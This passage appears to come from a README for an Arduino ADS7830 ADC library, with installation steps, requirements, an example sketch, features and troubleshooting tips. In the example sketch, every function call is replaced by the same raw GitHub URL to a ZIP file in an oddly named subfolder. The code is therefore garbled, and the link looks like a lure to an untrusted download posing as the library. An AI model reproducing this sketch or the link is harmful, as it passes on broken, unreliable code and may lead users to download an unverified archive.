   - Go to the menu and click on **Sketch** > **Include Library** > **Add .ZIP Library**.
   - Navigate to the folder where you extracted the library and select the ZIP file or the folder directly, then click **Open**.

Your library should now be added to your Arduino IDE.

### üíª System Requirements

- **Operating System:** Windows, Mac, or Linux
- **Arduino IDE Version:** 1.8 or higher
- **Board Compatibility:** Compatible with any Arduino board that supports the I2C protocol.

### ‚öôÔ∏è Example Usage

Here is a basic example to get you started with reading from the ADS7830 using this library. You can find further examples in the library folder after installation.

```cpp
#include <Wire.h>
#include <ADS7830.h>

ADS7830 adc;

void setup() {
  https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(9600);
  https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(0x48); // Default I2C address for ADS7830
}

void loop() {
  for (int i = 0; i < 8; i++) {
    int value = https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(i);
    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip("Channel ");
    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(i);
    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(": ");
    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(value);
  }
  delay(1000);
}
```

In this example, the code initializes the ADC and reads values from all 8 channels every second.

### üìö Features

- **Multiple Channel Support:** Read from 8 different channels.
- **Easy Integration:** Simple setup through the Arduino IDE without deep programming skills.
- **I2C Communication:** Use only two wires for communication.
- **Analog Measurement:** Get precise analog voltage readings.

### üõ†Ô∏è Troubleshooting

If you encounter issues, please try the following:

- Ensure that the library is correctly installed in the Arduino IDE.
- Check that your wiring corresponds with the I2C connections.
- Make sure you are using the right I2C address for your ADS7830 module. The default is often `0x48`.
